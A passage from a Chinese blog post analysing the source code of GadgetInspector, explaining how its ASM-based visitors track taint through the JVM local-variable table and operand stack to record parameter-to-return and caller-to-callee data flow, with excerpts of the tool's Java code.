HashMap&lt;&gt;();</span><br></pre></td></tr></table></figure><p>首先passthroughDataflow主要负责的是存储参数污染结果，key对应方法名，value对应的是可以污染下去的参数索引集合。</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201130145525684.png" alt="image-20201130145525684"></p><p>接下来，遍历经历过拓扑排序过的方法；</p><p>首先第一步会跳过静态初始化代码，因为静态代码块基本上是没法被污染的，直接在类加载阶段就会执行。</p><p>第二步在遍历的每个方法过程中，获取它所属的类，对其进行ASM访问者模式的分析：</p><p>跟进PassthroughDataflowClassVisitor中分析，重点还是在visitMethod方法中</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201130150835717.png" alt="image-20201130150835717"></p><p>是这样的，对于每一个类中对的每一个方法都会经历PassthroughDataflowClassVisitor这一步。对于类中的每一个方法都会进行它的方法（例如visit，visitMethod），对于每一个方法都会在visitMethod里面走一遭。</p><p>那么对于ASM在观察到每一个方法都会执行visitMethod方法，通过<strong>此处重新判断所观察的方法是不是我们想找、所关心的方法</strong>，只有我们关心的方法才能继续下去，进入PassthroughDataflowMethodVisitor继续观察。</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201130154509973.png" alt="image-20201130154509973"></p><p>继续跟进PassthroughDataflowMethodVisitor，可以看到，它继承了TaintTrackingMethodVisitor，并有以下几个方法的实现：</p><ol><li>visitCode：在进入方法的第一时间，ASM会先调用这个方法</li><li>visitInsn：在方法体中，每一个字节码操作指令的执行，ASM都会调用这个方法，return</li><li>visitFieldInsn：对于字段的调用，ASM都会调用这个方法</li><li>visitMethodInsn：方法体内，一旦调用了其他方法，都会触发这个方法的调用</li></ol><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201130154944412.png" alt="image-20201130154944412"></p><p>还有一个父类中的方法：</p><p>visitVarInsn：这个方法在方法体内进行字节码操作变量时，会被调用。</p><p>为了实现类似污点分析，去分析参数对方法的污染，其模仿了jvm，实现了两个集合，分别是本地变量表和操作数栈，通过其，实现具体的污点分析，那么具体是怎么进行的呢？</p><p>这里写一下具体细节：</p><p>visitCode-&gt;gadgetinspector.TaintTrackingMethodVisitor#visitVarInsn(在父类里面)-&gt;visitInsn更新污染表-&gt;gadgetinspector.PassthroughDiscovery#calculatePassthroughDataflow</p><p>这里需要跟一下gadgetinspector的逻辑：</p><p>首先：</p><p>本地变量表：List&lt;Set<T>&gt; localVars;</T></p><p>操作数栈：List&lt;Set<T>&gt; stackVars;</T></p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210316195921976.png" alt="image-20210316195921976"></p><p>这里借鉴一下<a href="https://xz.aliyun.com/t/7058" target="_blank" rel="noopener">threedr3am</a>的例子：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201130160432170.png" alt="image-20201130160432170"></p><p>逆拓扑结果：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201130160447220.png" alt="image-20201130160447220"></p><p>按照这个例子来分析：</p><ul><li><p>A.method1:</p><p>第一步，ASM对A.method1进行观察，也就是PassthroughDataflowMethodVisitor进行观察，那么，在其方法被执行开始的时候，会触发PassthroughDataflowMethodVisitor.visitCode方法的调用，在这一步的代码中，会首先对方法是否是static方法等进行判断，接着做了一个操作，就是把入参放到了本地变量表中来，为什么要这样做呢？我们可以想象一下，一个方法内部，能用到的数据要不就是本地变量表的数据，要不就是通过字段调用的数据，那么，在分析调用其他方法，或者对返回值是否会被入参污染时的数据流动，都跟它紧密关联，为什么这样说？根据jvm字节码的操作，<strong>在调用方法前，肯定需要对相关参数进行入栈</strong>，那入栈的数据从哪里来，必然就是本地变量表或者其他字段(这里的其他字段估计是其他方法的返回值)。那么在形成这样的一个本地变量表之后，就能标识一个方法内部的数据流动，并最终确定污染结果。</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210318193555532.png" alt="image-20210318193555532"></p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210318193611196.png" alt="image-20210318193611196"></p></li></ul><p>  上面的这步savedVariableState.localVars.set(index, values);其实就是在局部变量表里面更新索引。</p><p>  第二步，这里三梦师傅写得很乱，仔细查了一下，visitVarInsn是访问局部变量指令。 局部变量指令是加载loads或存储stores局部变量值的指令。也就是说出现这些<em>ILOAD, LLOAD, FLOAD, DLOAD, ALOAD, ISTORE, LSTORE, FSTORE, DSTORE, ASTORE or RET.</em>指令的时候，可以触发这个方法。</p><p>  <img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210318195425611.png" alt="image-20210318195425611"></p><p>  这里继续跟，该到new A().method1(args)调用，JVM会执行指令aload1（将局部变量表1号位置的元素入栈）对其参数args进行入栈，因为args是引用类型，那么操作代码就是Opcodes.ALOAD1，可以看到，代码中，从本地变量表获取了变量索引，并放入到操作数栈中来。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitVarInsn</span><span class="params">(<span class="keyword">int</span> opcode, <span class="keyword">int</span> <span class="keyword">var</span>)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Extend local variable state to make sure we include the variable index</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = savedVariableState.localVars.size(); i &lt;= <span class="keyword">var</span>; i++) &#123;</span><br><span class="line">            savedVariableState.localVars.add(<span class="keyword">new</span> HashSet&lt;T&gt;());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Set&lt;T&gt; saved0;</span><br><span class="line">        <span class="keyword">switch</span>(opcode) &#123;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.ILOAD:</span><br><span class="line">            <span class="keyword">case</span> Opcodes.FLOAD:</span><br><span class="line">                push();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.LLOAD:</span><br><span class="line">            <span class="keyword">case</span> Opcodes.DLOAD:</span><br><span class="line">                push();</span><br><span class="line">                push();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.ALOAD:</span><br><span class="line">                push(savedVariableState.localVars.get(<span class="keyword">var</span>));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.ISTORE:</span><br><span class="line">            <span class="keyword">case</span> Opcodes.FSTORE:</span><br><span class="line">                pop();</span><br><span class="line">                savedVariableState.localVars.set(<span class="keyword">var</span>, <span class="keyword">new</span> HashSet&lt;T&gt;());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.DSTORE:</span><br><span class="line">            <span class="keyword">case</span> Opcodes.LSTORE:</span><br><span class="line">                pop();</span><br><span class="line">                pop();</span><br><span class="line">                savedVariableState.localVars.set(<span class="keyword">var</span>, <span class="keyword">new</span> HashSet&lt;T&gt;());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.ASTORE:</span><br><span class="line">                saved0 = pop();</span><br><span class="line">                savedVariableState.localVars.set(<span class="keyword">var</span>, saved0);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.RET:</span><br><span class="line">                <span class="comment">// No effect on stack</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Unsupported opcode: "</span> + opcode);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>  <img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210318195552582.png" alt="image-20210318195552582"></p><p>  第三步，这时则需要areturn，弹出操作数栈。执行了areturn方法，那么就会触发visitInsn这个方法，因为返回的是引用类型，那么相应的指令就是Opcodes.ARETURN，可以看到，在这个case中，会从栈顶，获取刚刚入栈（第二步中visitVarInsn从本地变量表获取的参数索引）的参数索引，并存储到returnTaint中，因此，即<strong>表示A.method1这个方法的调用，参数索引为1的参数param会污染返回值</strong>。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInsn</span><span class="params">(<span class="keyword">int</span> opcode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.IRETURN:<span class="comment">//从当前方法返回int</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.FRETURN:<span class="comment">//从当前方法返回float</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.ARETURN:<span class="comment">//从当前方法返回对象引用</span></span><br><span class="line">            returnTaint.addAll(getStackTaint(<span class="number">0</span>));<span class="comment">//栈空间从内存高位到低位分配空间</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.LRETURN:<span class="comment">//从当前方法返回long</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.DRETURN:<span class="comment">//从当前方法返回double</span></span><br><span class="line">            returnTaint.addAll(getStackTaint(<span class="number">1</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.RETURN:<span class="comment">//从当前方法返回void</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">super</span>.visitInsn(opcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Set&lt;T&gt; <span class="title">getStackTaint</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//出栈，index=0为栈顶</span></span><br><span class="line">        <span class="keyword">return</span> savedVariableState.stackVars.get(savedVariableState.stackVars.size()-<span class="number">1</span>-index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Set&lt;Integer&gt; returnTaint;<span class="comment">//被污染的返回数据</span></span><br></pre></td></tr></table></figure><p>  第四步，经过return之后，该方法的观察也就结束了，那么，回到gadgetinspector.PassthroughDiscovery#calculatePassthroughDataflow中，对于刚刚放到returnTaint污点分析结果，也会在其方法中，缓存到passthroughDataflow。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ClassReader cr = <span class="keyword">new</span> ClassReader(inputStream);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    PassthroughDataflowClassVisitor cv = <span class="keyword">new</span> PassthroughDataflowClassVisitor(classMap, inheritanceMap,</span><br><span class="line">            passthroughDataflow, serializableDecider, Opcodes.ASM6, method);</span><br><span class="line">    cr.accept(cv, ClassReader.EXPAND_FRAMES);</span><br><span class="line">    passthroughDataflow.put(method, cv.getReturnTaint());<span class="comment">//缓存方法返回值与哪个参数有关系</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    LOGGER.error(<span class="string">"Exception analyzing "</span> + method.getClassReference().getName(), e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>C.method3:</p><p>同method1</p></li><li><p>B.method2:</p><p>先看method2字节码：</p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210318203426098.png" alt="image-20210318203426098" style="zoom:80%;"><p>这个方法和前面连个都不一样，它内部调用了C.method3方法，因此，污点分析时，具体的细节就又不一样了：</p><p>第一步，在其方法被执行开始的时候，同样会触发PassthroughDataflowMethodVisitor.visitCode方法的调用，在其中，也是做了相应的操作，把入参存到了本地变量表中来；</p><p>第二步，因为方法内部即将调用C.method3，那么ASM调用visitVarInsn方法，对其参数param进行入栈，因为param是引用类型，那么操作代码就是Opcodes.ALOAD，因此，从第一步保存的本地变量表中获取变量入栈；</p><p>这里仔细看，method2 准备调用method3时的状态：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210318210935086.png" alt="image-20210318210935086"></p><p>在ALOAD_1这一步之后，localvars=(0.0;1.1);stackVars=(0.0;1.1);</p><p>第三步，方法内部调用了C.method3，那么，ASM就会触发visitMethodInsn方法的执行，在这一步，会先对被调用方法的入参进行处理，<strong>并把被调用方法的实例放到argTypes的第一个索引位置</strong>，后面依次放置其他参数，接着计算返回值大小。然后，因为方法调用，第二步已经把参数入栈stack了，而这些参数都是从本地变量表获取的，那么，可以从栈顶取到相关参数，并认为这些参数是可被控制，也就是被当前调用者caller方法污染的。</p><p>这里进入visitMethodInsn方法具体看一下：</p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210318222907723.png" alt="image-20210318222907723" style="zoom:50%;"><p>执行到这里，argTypes存放的是（Cthis，String）</p></li></ul><p>  最后，也就是最重点的一步，从passthroughDataflow中获取了被调用方法的参数污染结果，也就是上一个方法C.method3方法被分析时候，return存储的数据，所以，这里就印证了前面为什么要使用逆拓扑排序，因为如果不这样做的话，C.method3可能在B.method2后被分析，那么，缓存就不可能存在污点分析的结果，那么就没办法对B.method2进行正确的污点分析。接着就是对从缓存取出的污染结果和入参对比，取出相应索引的污点参数，放入到resultTaint中。</p><p>  gadgetinspector.TaintTrackingMethodVisitor#visitMethodInsn</p><ul><li><p>main:  最后需要分析的是main方法的入参args是否会污染到其返回值</p><p>第一步，执行visitCode存储入参到本地变量表</p><p>第二步，执行visitVarInsn参数入栈</p><p>第三步，执行visitMethodInsn调用A.method1，A.method1被污染的返回结果，也就是参数索引会被放在栈顶</p><p>第四步，执行visitVarInsn把放在栈顶的污染参数索引，放入到本地变量表</p><p>第五步，执行visitVarInsn参数入栈</p><p>第六步，执行visitMethodInsn调用B.method2，被污染的返回结果会被放在栈顶</p><p>第七步，执行visitInsn，返回栈顶数据，缓存到passthroughDataflow，也就是main方法的污点分析结果</p><p>到此，ASM实现方法入参污染返回值的分析就到此为止了。</p><p>接下来，passthroughDiscovery.save方法就被调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (passthroughDataflow == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Save called before discover()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">"passthrough.dat"</span>), <span class="keyword">new</span> PassThroughFactory(), passthroughDataflow.entrySet());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是通过DataLoader.saveData把结果一行一行的保存到passthrough.dat文件中，而每行数据的序列化，是通过PassThroughFactory实现</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201130172722782.png" alt="image-20201130172722782"></p><p>最终，这一阶段分析保存下来passthrough.dat文件的数据格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类名 方法名 方法描述 能污染返回值的参数索引<span class="number">1</span>,能污染返回值的参数索引<span class="number">2</span>,能污染返回值的参数索引<span class="number">3</span>...</span><br></pre></td></tr></table></figure></li></ul><h2 id="方法调用探索-CallGraphDiscovery"><a href="#方法调用探索-CallGraphDiscovery" class="headerlink" title="方法调用探索 CallGraphDiscovery"></a>方法调用探索 CallGraphDiscovery</h2><p>这一步和上一步类似，gadgetinspector 会再次扫描全部的Java方法，但检查的不再是参数与返回结果的关系，而是<strong>方法的参数与其所调用的子方法的关系，即子方法的参数是否可以被父方法的参数所影响</strong>。</p><p>看下面这个<a href="https://paper.seebug.org/1034/#step2-passthrough" target="_blank" rel="noopener">例子</a>：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210316211044098.png" alt="image-20210316211044098"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">调用者类名 调用者方法caller 调用者方法描述 被调用者类名 被调用者方法target 被调用者方法描述 调用者方法参数索引 调用者字段名 被调用者方法参数索引</span><br><span class="line">Main (Ljava/lang/String;)<span class="function">V main A <span class="title">method1</span> <span class="params">(Ljava/lang/String;)</span>Ljava/lang/String</span>; <span class="number">1</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>先看作者给出的例子：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210316212942997.png" alt="image-20210316212942997"></p><p>1/AbstractTableModel$ff19274a.hashcode与子方法IFn.invoke：</p><ul><li>AbstractTableModel$ff19274a.hashcode的this(0参)传递给了IFn.invoke的1参，0-&gt;IFn.invoke()@1</li><li>这里f是通过this._clojureFnMap(0参)获得的，并且f又作为IFn.invoke()的this(也是0参)，换句话说：AbstractTableModel$ff19274a.hashcode的0参传递给了IFn.invoke的零参，表示为0-&gt;IFn.invoke()@0</li></ul><p>2/FnCompose.invoke与子方法IFn.invoke：</p><ul><li>首先先看最里面，f1.invoke(arg)的参数arg为IFn.invoke(Object arg)的参数 都是1参 所以 1-&gt;IFn.invoke()@1 </li><li>第二层，f1.invoke(arg)里面的f1，是FnCompose的类属性 属于0参 在f1.invoke(arg)里面也是this，所以0-&gt;IFn.invoke()@0</li><li>第三层，f2.invoke(f1.invoke(arg))，这里面 f1.invoke(arg)按道理是作为1参，但是对于f1反序列化来说，我们可以控制具体是IFn的哪个实现类，所以这里f1.invoke(arg)也可以看成是0参(一种合理的风险推测)，所以是0-&gt;IFn.invoke()@1</li></ul><p>具体看源码</p><p>discover-&gt;ModelGeneratorClassVisitor</p><p>直接跟gadgetinspector.CallGraphDiscovery#discover：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201201093433260.png" alt="image-20201201093433260"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加载所有方法信息</span></span><br><span class="line">Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line"><span class="comment">//加载所有类信息</span></span><br><span class="line">Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line"><span class="comment">//加载所有父子类、超类、实现类关系</span></span><br><span class="line">InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line"><span class="comment">//加载所有方法参数和返回值的污染关联</span></span><br><span class="line">Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = PassthroughDiscovery.load();</span><br></pre></td></tr></table></figure><p>接着遍历每一个class，并对其使用ASM进行观察：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201201094123852.png" alt="image-20201201094123852"></p><p>ModelGeneratorClassVisitor实现主要就是对每一个方法都进行了ASM的观察：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201201095156174.png" alt="image-20201201095156174"></p><p>ModelGeneratorMethodVisitor的实现，是这一步的重点逻辑所在，因为单单文字描述可能理解不太清楚，这边继续以<a href="https://xz.aliyun.com/t/7058" target="_blank" rel="noopener">一个例子</a>进行讲解：</p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210319000648951.png" alt="image-20210319000648951" style="zoom:50%;"><p>可以看到上述例子中，Main的main方法中，调用了A.method1方法，并且入参是main的参数args以及Main的字段name</p><p>ASM的实现流程：</p><ul><li>在Main.main方法体被观察到的第一时间，ASM会调用ModelGeneratorMethodVisitor.visitCode，在这个方法中，根据参数的数量，一一形成名称arg0、arg1…，然后放入到本地变量表，本地变量表现在是0:arg0，1:args;</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.visitCode();</span><br><span class="line">    <span class="keyword">int</span> localIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> argIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//使用arg前缀来表示方法入参，后续用于判断是否为目标调用方法的入参</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">        setLocalTaint(localIndex, <span class="string">"arg"</span> + argIndex);</span><br><span class="line">        localIndex += <span class="number">1</span>;</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">        setLocalTaint(localIndex, <span class="string">"arg"</span> + argIndex);</span><br><span class="line">        localIndex += argType.getSize();</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接着，因为即将要调用A.method1，ASM会调用visitVarInsn，先是aload_1将本地变量表中1号索引args入栈，然后aload_0将arg0入栈。</li></ul><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201201101122436.png" alt="image-20201201101122436" style="zoom:50%;"><ul><li><p>然后，ASM调用visitVarInsn把当前实例对应的参数入栈，上一步visitCode已经把实例命名为arg0存在本地变量表中，因此入栈的参数名称为arg0，接下来会执行getfield指令，对应调用ASM内部的visitFieldInsn获取字段name，并命名为arg0.name入栈。这里详细说一下，作者这里判断了字段是否是transient的。</p><blockquote><p>transient修饰符通常用于在那些实现了序列化接口的类中，不想被序列化的field。</p><p>一旦被transient修饰过后的变量，该变量内容在序列化后无法获得访问。</p></blockquote></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.GETSTATIC:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.PUTSTATIC:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.GETFIELD:</span><br><span class="line">                    Type type = Type.getType(desc);<span class="comment">//获取字段类型</span></span><br><span class="line">                    <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="comment">//size=1可能为引用类型</span></span><br><span class="line">                        Boolean isTransient = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// If a field type could not possibly be serialized, it's effectively transient</span></span><br><span class="line">                        <span class="comment">//判断调用的字段类型是否可序列化</span></span><br><span class="line">                        <span class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> ClassReference.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                            isTransient = Boolean.TRUE;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">//若调用的字段可被序列化，则取当前类实例的所有字段，找出调用的字段，去判断是否被标识了transient</span></span><br><span class="line">                            ClassReference clazz = classMap.get(<span class="keyword">new</span> ClassReference.Handle(owner));</span><br><span class="line">                            <span class="keyword">while</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                <span class="comment">//遍历字段，判断是否是transient类型，以确定是否可被序列化</span></span><br><span class="line">                                <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                        isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (isTransient != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="comment">//若找不到字段，则向上父类查找，继续遍历</span></span><br><span class="line">                                clazz = classMap.get(<span class="keyword">new</span> ClassReference.Handle(clazz.getSuperClass()));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        Set&lt;Integer&gt; taint;</span><br><span class="line">                        <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                            <span class="comment">//若不是Transient字段，则从栈顶取出它，取出的是this或某实例变量，即字段所属实例</span></span><br><span class="line">                            taint = getStackTaint(<span class="number">0</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            taint = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">                        <span class="comment">//在调用方法前，都会先入栈，作为参数</span></span><br><span class="line">                        setStackTaint(<span class="number">0</span>, taint);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span 